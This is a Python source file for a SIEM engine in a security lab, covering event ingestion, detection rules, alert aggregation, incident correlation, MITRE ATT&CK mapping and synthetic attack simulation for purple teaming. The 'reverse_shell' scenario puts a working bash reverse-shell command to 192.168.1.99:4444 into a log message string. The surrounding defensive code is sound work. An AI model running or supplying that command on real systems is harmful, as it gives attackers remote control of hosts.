"""
SIEM Core Engine (Phase 6)
Handles event normalization, rule evaluation, alert aggregation, incident correlation, and MITRE mapping.
"""
import json
import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List, Optional
from sqlalchemy.orm import Session
from app.models.siem import (
    SecurityEvent, SecurityAlert, SecurityIncident,
    EventCategory, EventSeverity, AlertStatus, IncidentStatus
)
from app.schemas.siem import SecurityEventCreate, MitreTechniqueCount, MitreMatrixSummary, SIEMKPIs
from app.siem.rules import ALL_RULES, DetectionRuleDef

logger = logging.getLogger("cyberlab.siem")

# Standard MITRE ATT&CK Framework Baseline Techniques
MITRE_BASELINE_TACTICS = {
    "Initial Access": [
        {"id": "T1190", "name": "Exploit Public-Facing Application"},
        {"id": "T1133", "name": "External Remote Services"},
    ],
    "Execution": [
        {"id": "T1059.004", "name": "Unix Shell"},
        {"id": "T1204", "name": "User Execution"},
    ],
    "Persistence": [
        {"id": "T1053", "name": "Scheduled Task / Cron"},
        {"id": "T1136", "name": "Create Account"},
    ],
    "Privilege Escalation": [
        {"id": "T1548.003", "name": "Sudo and Sudo Caching"},
        {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
    ],
    "Defense Evasion": [
        {"id": "T1070", "name": "Indicator Removal on Host"},
        {"id": "T1562", "name": "Impair Defenses"},
    ],
    "Credential Access": [
        {"id": "T1110", "name": "Brute Force"},
        {"id": "T1003.008", "name": "/etc/passwd and /etc/shadow"},
    ],
    "Discovery": [
        {"id": "T1046", "name": "Network Service Discovery"},
        {"id": "T1087", "name": "Account Discovery"},
        {"id": "T1082", "name": "System Information Discovery"},
    ],
    "Lateral Movement": [
        {"id": "T1021", "name": "Remote Services / SSH"},
    ],
    "Impact": [
        {"id": "T1489", "name": "Service Stop"},
    ]
}


class SIEMEngine:
    def _resolve_org_id(self, db: Session, organization_id: Optional[str] = None) -> str:
        from app.models.organization import Organization
        if organization_id and organization_id != "default-org":
            return organization_id
        org = db.query(Organization).first()
        if org:
            return org.id
        org = Organization(id="default-org", name="CyberLab Primary Research Lab", slug="primary-lab")
        db.add(org)
        db.commit()
        return org.id

    def ingest_event(
        self,
        db: Session,
        payload: SecurityEventCreate,
        organization_id: Optional[str] = None
    ) -> SecurityEvent:
        """Normalizes and persists an event, then evaluates detection rules and correlations."""
        organization_id = self._resolve_org_id(db, organization_id)
        raw_payload = dict(payload.raw_data or {})

        # Correlate against active Threat Intelligence IOCs (non-fatal if no org exists)
        try:
            from app.threat_intel.engine import ThreatIntelEngine
            candidates = [payload.source_ip or "", payload.destination_ip or "", payload.message or ""]
            tip = ThreatIntelEngine(db, organization_id)
            ioc_hits = tip.match_indicators(candidates)
            if ioc_hits:
                raw_payload["threat_intel_ioc_match"] = [f"{h.ioc_type}:{h.value} ({h.threat_actor})" for h in ioc_hits]
        except Exception:
            pass

        event = SecurityEvent(
            organization_id=organization_id,
            timestamp=datetime.now(timezone.utc),
            category=payload.category,
            severity=payload.severity,
            action=payload.action,
            message=payload.message,
            asset_id=payload.asset_id,
            hostname=payload.hostname,
            source_ip=payload.source_ip,
            destination_ip=payload.destination_ip,
            mitre_tactic=payload.mitre_tactic,
            mitre_technique_id=payload.mitre_technique_id,
            mitre_technique_name=payload.mitre_technique_name,
            raw_data_json=json.dumps(raw_payload)
        )
        db.add(event)
        db.flush()

        # Query recent events (last 5 mins) for stateful rule evaluation
        since = datetime.now(timezone.utc) - timedelta(minutes=5)
        recent_events = db.query(SecurityEvent).filter(
            SecurityEvent.timestamp >= since
        ).order_by(SecurityEvent.timestamp.desc()).limit(100).all()

        # Rule evaluation
        for rule in ALL_RULES:
            if rule.evaluate(event, recent_events):
                self._trigger_alert(db, rule, event, organization_id)

        db.commit()
        db.refresh(event)
        return event

    def _trigger_alert(
        self,
        db: Session,
        rule: DetectionRuleDef,
        event: SecurityEvent,
        organization_id: str
    ) -> SecurityAlert:
        """Creates or aggregates a SecurityAlert when a detection rule fires."""
        # Update event MITRE fields if not already populated
        if not event.mitre_technique_id:
            event.mitre_tactic = rule.mitre_tactic
            event.mitre_technique_id = rule.mitre_technique_id
            event.mitre_technique_name = rule.mitre_technique_name

        # Check for open alert within the last 15 minutes for the same rule and target
        window = datetime.now(timezone.utc) - timedelta(minutes=15)
        existing_alert = db.query(SecurityAlert).filter(
            SecurityAlert.rule_id == rule.rule_id,
            SecurityAlert.hostname == event.hostname,
            SecurityAlert.status == AlertStatus.OPEN,
            SecurityAlert.last_seen >= window
        ).first()

        if existing_alert:
            existing_alert.evidence_count += 1
            existing_alert.last_seen = datetime.now(timezone.utc)
            alert = existing_alert
            logger.info(f"Aggregated evidence for alert '{alert.title}' on {event.hostname} (count: {alert.evidence_count})")
        else:
            alert = SecurityAlert(
                organization_id=organization_id,
                rule_id=rule.rule_id,
                title=rule.title,
                description=rule.description,
                severity=rule.severity,
                status=AlertStatus.OPEN,
                asset_id=event.asset_id,
                hostname=event.hostname,
                source_ip=event.source_ip,
                mitre_tactic=rule.mitre_tactic,
                mitre_technique_id=rule.mitre_technique_id,
                mitre_technique_name=rule.mitre_technique_name,
                evidence_count=1,
                first_seen=datetime.now(timezone.utc),
                last_seen=datetime.now(timezone.utc),
                details_json=json.dumps({"triggering_event_id": event.id, "initial_message": event.message})
            )
            db.add(alert)
            db.flush()
            logger.warning(f"NEW SECURITY ALERT: [{rule.severity}] {rule.title} on host {event.hostname}")

        # Incident correlation: check if 2+ distinct alerts exist on the host
        self._correlate_incident(db, alert, organization_id)
        return alert

    def _correlate_incident(self, db: Session, alert: SecurityAlert, organization_id: str) -> Optional[SecurityIncident]:
        """Correlates multiple distinct alerts on a host into a unified SecurityIncident."""
        if not alert.hostname:
            return None

        # Look for open incident for this host
        incident = db.query(SecurityIncident).filter(
            SecurityIncident.primary_hostname == alert.hostname,
            SecurityIncident.status == IncidentStatus.OPEN
        ).first()

        # Find all open alerts for this host
        open_alerts = db.query(SecurityAlert).filter(
            SecurityAlert.hostname == alert.hostname,
            SecurityAlert.status == AlertStatus.OPEN
        ).all()

        distinct_rules = set(a.rule_id for a in open_alerts)

        if len(distinct_rules) >= 2:
            tactics = list(set(a.mitre_tactic for a in open_alerts if a.mitre_tactic))
            techniques = list(set(a.mitre_technique_id for a in open_alerts if a.mitre_technique_id))

            if not incident:
                incident = SecurityIncident(
                    organization_id=organization_id,
                    title=f"Multi-Stage Security Incident on {alert.hostname}",
                    severity=EventSeverity.CRITICAL if any(a.severity == EventSeverity.CRITICAL for a in open_alerts) else EventSeverity.HIGH,
                    status=IncidentStatus.OPEN,
                    asset_id=alert.asset_id,
                    primary_hostname=alert.hostname,
                    alert_count=len(open_alerts),
                    mitre_tactics_json=json.dumps(tactics),
                    mitre_techniques_json=json.dumps(techniques),
                    summary=f"Automated correlation identified {len(distinct_rules)} distinct threat vectors ({', '.join(tactics)}) active against host {alert.hostname}."
                )
                db.add(incident)
                db.flush()
                logger.error(f"CORRELATED INCIDENT CREATED: {incident.title} (ID: {incident.id})")
            else:
                incident.alert_count = len(open_alerts)
                incident.mitre_tactics_json = json.dumps(tactics)
                incident.mitre_techniques_json = json.dumps(techniques)
                incident.updated_at = datetime.now(timezone.utc)

            # Link alerts to incident
            for a in open_alerts:
                a.incident_id = incident.id

            return incident

        return None

    def simulate_attack(
        self,
        db: Session,
        scenario: str,
        target_hostname: str = "metasploitable2",
        target_ip: str = "192.168.1.120",
        organization_id: str = "default-org"
    ) -> List[SecurityEvent]:
        """Injects realistic multi-stage synthetic attack sequences for verification and purple teaming."""
        events_to_create = []

        if scenario == "brute_force":
            # 3 failed logins followed by 1 success
            for i in range(3):
                events_to_create.append(SecurityEventCreate(
                    category=EventCategory.AUTHENTICATION,
                    severity=EventSeverity.LOW,
                    action="FAILURE",
                    message=f"Failed password for invalid user admin from 192.168.1.99 port {45000+i} ssh2",
                    hostname=target_hostname,
                    source_ip="192.168.1.99",
                    destination_ip=target_ip,
                    mitre_tactic="Credential Access",
                    mitre_technique_id="T1110",
                    mitre_technique_name="Brute Force"
                ))

        elif scenario == "privilege_escalation":
            events_to_create.append(SecurityEventCreate(
                category=EventCategory.AUTHENTICATION,
                severity=EventSeverity.HIGH,
                action="FAILURE",
                message=f"sudo: user 'www-data' : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",
                hostname=target_hostname,
                source_ip="192.168.1.99",
                destination_ip=target_ip,
                mitre_tactic="Privilege Escalation",
                mitre_technique_id="T1548.003",
                mitre_technique_name="Sudo and Sudo Caching"
            ))

        elif scenario == "credential_dumping":
            events_to_create.append(SecurityEventCreate(
                category=EventCategory.FILE_INTEGRITY,
                severity=EventSeverity.CRITICAL,
                action="DETECTED",
                message=f"FIM Alert: SHA-256 hash modified on /etc/shadow. Unauthorized account creation or credential tampering detected.",
                hostname=target_hostname,
                source_ip="192.168.1.99",
                destination_ip=target_ip,
                mitre_tactic="Credential Access",
                mitre_technique_id="T1003.008",
                mitre_technique_name="/etc/passwd and /etc/shadow"
            ))

        elif scenario == "reverse_shell":
            events_to_create.append(SecurityEventCreate(
                category=EventCategory.PROCESS_EXECUTION,
                severity=EventSeverity.CRITICAL,
                action="DETECTED",
                message=f"Suspicious process execution: /bin/bash -i >& /dev/tcp/192.168.1.99/4444 0>&1 (Reverse Interactive Shell)",
                hostname=target_hostname,
                source_ip="192.168.1.99",
                destination_ip=target_ip,
                mitre_tactic="Execution",
                mitre_technique_id="T1059.004",
                mitre_technique_name="Unix Shell"
            ))

        results = []
        for ec in events_to_create:
            ev = self.ingest_event(db, ec, organization_id=organization_id)
            results.append(ev)

        return results

    def get_mitre_matrix(self, db: Session) -> MitreMatrixSummary:
        """Returns the complete MITRE ATT&CK Matrix populated with active detection counts."""
        matrix: Dict[str, List[MitreTechniqueCount]] = {}
        active_count = 0
        total_mapped = 0

        # Query counts grouped by technique_id from events and alerts
        events = db.query(SecurityEvent).all()
        alerts = db.query(SecurityAlert).all()

        evt_counts: Dict[str, int] = {}
        for e in events:
            if e.mitre_technique_id:
                evt_counts[e.mitre_technique_id] = evt_counts.get(e.mitre_technique_id, 0) + 1

        alert_counts: Dict[str, int] = {}
        for a in alerts:
            if a.mitre_technique_id:
                alert_counts[a.mitre_technique_id] = alert_counts.get(a.mitre_technique_id, 0) + 1

        for tactic, techniques in MITRE_BASELINE_TACTICS.items():
            tech_list = []
            for t in techniques:
                total_mapped += 1
                tid = t["id"]
                ec = evt_counts.get(tid, 0)
                ac = alert_counts.get(tid, 0)
                if ec > 0 or ac > 0:
                    active_count += 1
                tech_list.append(MitreTechniqueCount(
                    technique_id=tid,
                    technique_name=t["name"],
                    tactic=tactic,
                    event_count=ec,
                    alert_count=ac
                ))
            matrix[tactic] = tech_list

        return MitreMatrixSummary(
            total_techniques_mapped=total_mapped,
            active_techniques_triggered=active_count,
            tactics=matrix
        )

    def get_kpis(self, db: Session) -> SIEMKPIs:
        """Aggregates SIEM counts and severity breakdown."""
        events = db.query(SecurityEvent).all()
        alerts = db.query(SecurityAlert).all()
        incidents = db.query(SecurityIncident).filter(SecurityIncident.status == IncidentStatus.OPEN).all()

        by_sev: Dict[str, int] = {}
        for a in alerts:
            by_sev[a.severity] = by_sev.get(a.severity, 0) + 1

        by_cat: Dict[str, int] = {}
        for e in events:
            by_cat[e.category] = by_cat.get(e.category, 0) + 1

        open_alerts = sum(1 for a in alerts if a.status == AlertStatus.OPEN)

        return SIEMKPIs(
            total_events=len(events),
            total_alerts=len(alerts),
            open_alerts=open_alerts,
            active_incidents=len(incidents),
            by_severity=by_sev,
            by_category=by_cat
        )


siem_engine = SIEMEngine()
